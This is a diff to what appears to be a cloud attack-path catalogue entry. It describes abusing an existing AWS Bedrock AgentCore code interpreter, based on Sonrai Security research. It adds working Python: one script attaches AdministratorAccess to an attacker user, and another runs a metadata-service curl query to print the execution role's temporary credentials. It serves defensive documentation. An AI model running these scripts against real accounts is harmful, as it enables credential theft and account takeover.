@@ -94,6 +94,14 @@ discoveredBy:
   name: Nigel Sood
   organization: Sonrai Security
   date: '2025'
+discoveryAttribution:
+  firstDocumented:
+    source: Sonrai Security
+    date: 2025
+    link: https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/
+  derivativeOf:
+    pathId: bedrock-001
+    modification: "Targets existing code interpreters instead of creating new ones, eliminating the need for iam:PassRole and bedrock-agentcore:CreateCodeInterpreter permissions"
 references:
 - title: 'AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling'
   url: https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/
@@ -131,19 +139,74 @@ attackVisualization:
       description: |
         An existing Bedrock AgentCore code interpreter with a privileged execution role already attached. The interpreter runs on a Firecracker MicroVM and has access to the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS.
 
-    - id: exfiltrate_creds
-      label: Exfiltrate Credentials
-      type: action
+    - id: execution_role
+      label: Code Interpreter Execution Role
+      type: principal
+      description: |
+        The IAM role attached to the code interpreter as its execution role. When code is executed in the interpreter, it automatically runs with this role's permissions. The role's temporary credentials are available through the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to how EC2 instances access IMDS. This role must trust bedrock.amazonaws.com in its trust policy.
+
+    - id: method_sdk_attack
+      label: "Method 1: Execute Attack via AWS SDK"
+      type: payload
       color: '#99ccff'
       description: |
-        Start a session with the existing code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the execution role's temporary credentials.
+        The malicious code interpreter code uses the AWS SDK within the Python execution environment to directly perform privileged actions using the execution role's credentials. Since the code interpreter automatically runs with the execution role's credentials available through the environment, no credential exfiltration is needed.
 
-        The Python code uses boto3 to:
-        1. Start a code interpreter session (bedrock-agentcore:StartCodeInterpreterSession)
-        2. Invoke code to execute a curl command targeting 169.254.169.254/latest/meta-data/iam/security-credentials/execution_role
-        3. Extract AccessKeyId, SecretAccessKey, and SessionToken from the MMDS response
+        Example Python code invoked in the interpreter:
+        ```python
+        import boto3
 
-        This is similar to exfiltrating credentials from an EC2 instance via IMDS, but targets the MicroVM's metadata service instead.
+        # The interpreter automatically has access to the execution role's credentials
+        iam = boto3.client('iam')
+
+        # Attach admin policy to starting user
+        iam.attach_user_policy(
+            UserName='attacker-user',
+            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+        )
+        ```
+
+        This is the most direct approach - the code interpreter immediately modifies IAM or performs other privileged actions using the execution role's permissions.
+
+    - id: method_cred_exfil
+      label: "Method 2: Exfiltrate Credentials to Output"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Start a session with the existing code interpreter and invoke Python code to query the MicroVM Metadata Service (MMDS) and retrieve the execution role's temporary credentials. The credentials are returned in the code interpreter's output and can be used from any location.
+
+        Example Python script to exfiltrate credentials:
+        ```python
+        import boto3
+        import sys
+
+        bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])
+        CODE_INTERPRETER_ID = sys.argv[1]
+
+        # Start a code interpreter session
+        session = bedrock_agentcore_client.start_code_interpreter_session(
+            codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+        )
+        session_id = session['sessionId']
+
+        # Command to query MMDS for credentials
+        code = 'IP="169.254.169.254"; METADATA="meta-data"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'
+
+        # Invoke the code interpreter to execute the command
+        response = bedrock_agentcore_client.invoke_code_interpreter(
+            codeInterpreterIdentifier=CODE_INTERPRETER_ID,
+            sessionId=session_id,
+            name='executeCommand',
+            arguments={'command': code}
+        )
+
+        # Extract and print credentials from the output
+        for event in response['stream']:
+            if event['result']['structuredContent']['stdout']:
+                print(event['result']['structuredContent']['stdout'])
+        ```
+
+        This is similar to exfiltrating credentials from an EC2 instance via IMDS, but targets the MicroVM's metadata service instead. This script retrieves AccessKeyId, SecretAccessKey, and SessionToken from the MMDS and outputs them. The attacker can then export these credentials and use them from any location until they expire.
 
     - id: admin
       label: Effective Administrator
@@ -183,44 +246,77 @@ attackVisualization:
         ```
 
     - from: code_interpreter
-      to: exfiltrate_creds
+      to: execution_role
       label: bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter
       description: |
-        Start a session with the existing code interpreter and invoke Python code to extract credentials from the MicroVM Metadata Service (MMDS).
+        The attacker starts a session with the existing code interpreter and invokes Python code. The code executes within the Firecracker MicroVM with automatic access to the execution role's credentials through the MicroVM Metadata Service (MMDS).
 
-        Execute the Python script that:
-        1. Starts a code interpreter session
-        2. Executes: `curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role`
-        3. Parses the JSON response to extract AccessKeyId, SecretAccessKey, and SessionToken
-
-        Command:
+        Commands:
         ```bash
-        # Run the credential extraction script
+        # Create and run the credential extraction script
         python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION
         ```
 
-        The Python script uses the bedrock-agentcore API to invoke arbitrary code within the MicroVM, which can then query the MMDS just like an EC2 instance queries IMDS.
+        The Python script uses the bedrock-agentcore API to start a session and invoke arbitrary code within the interpreter.
 
-    - from: exfiltrate_creds
+    - from: execution_role
+      to: method_sdk_attack
+      label: Option A
+      branch: A
+      description: |
+        The attacker designed the malicious Python code to use the AWS SDK to directly perform privileged actions. This is the most direct approach - the code interpreter immediately modifies IAM or performs other privileged actions using the execution role's permissions.
+
+    - from: execution_role
+      to: method_cred_exfil
+      label: Option B
+      branch: B
+      description: |
+        The attacker designed the malicious Python code to query the MicroVM Metadata Service and exfiltrate the execution role's credentials to the output. The attacker can then use these credentials from any location.
+
+    - from: method_sdk_attack
       to: admin
       label: If execution role has admin permissions
-      branch: A
+      branch: A1
       condition: admin
       description: |
-        If the code interpreter's execution role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access by using the exfiltrated credentials. The attacker can now perform any action in the AWS account.
+        If the code interpreter's execution role has AdministratorAccess or equivalent permissions, the SDK attack directly grants the starting principal full administrative access by attaching admin policies or creating admin access keys.
 
-    - from: exfiltrate_creds
+    - from: method_sdk_attack
       to: some_perms
       label: If execution role has some elevated permissions
-      branch: B
+      branch: A2
       condition: some_permissions
       description: |
-        If the execution role has some elevated permissions (data access, further escalation paths), the attacker can leverage the exfiltrated credentials for lateral movement or additional attacks. The attacker should use `aws sts get-caller-identity` and enumerate permissions to determine what additional access was gained.
+        If the execution role has some elevated permissions (data access, further escalation paths), the SDK attack can still grant useful additional permissions by modifying IAM within the role's permission scope or accessing sensitive resources.
 
-    - from: exfiltrate_creds
+    - from: method_sdk_attack
       to: no_access
       label: If execution role has minimal permissions
-      branch: C
+      branch: A3
+      condition: no_permissions
+      description: |
+        If the execution role only has minimal permissions (like logs:PutLogEvents), the SDK attack will fail to perform meaningful privilege escalation. The attacker would need to choose a different exploitation method or target a different code interpreter.
+
+    - from: method_cred_exfil
+      to: admin
+      label: If execution role has admin permissions
+      branch: B1
+      condition: admin
+      description: |
+        If the code interpreter's execution role has AdministratorAccess or equivalent permissions, the exfiltrated credentials provide the attacker with full administrative access to the AWS account from any location. The attacker can now perform any action in the AWS account.
+
+    - from: method_cred_exfil
+      to: some_perms
+      label: If execution role has some elevated permissions
+      branch: B2
+      condition: some_permissions
+      description: |
+        If the execution role has some elevated permissions (data access, further escalation paths), the exfiltrated credentials can be used for lateral movement or additional attacks. The attacker should use `aws sts get-caller-identity` and enumerate permissions to determine what additional access was gained.
+
+    - from: method_cred_exfil
+      to: no_access
+      label: If execution role has minimal permissions
+      branch: B3
       condition: no_permissions
       description: |
         If the execution role only has minimal permissions (like logs:PutLogEvents or basic CloudWatch metrics), the exfiltrated credentials provide limited value for privilege escalation. The attacker may need to target a different code interpreter with a more privileged role.
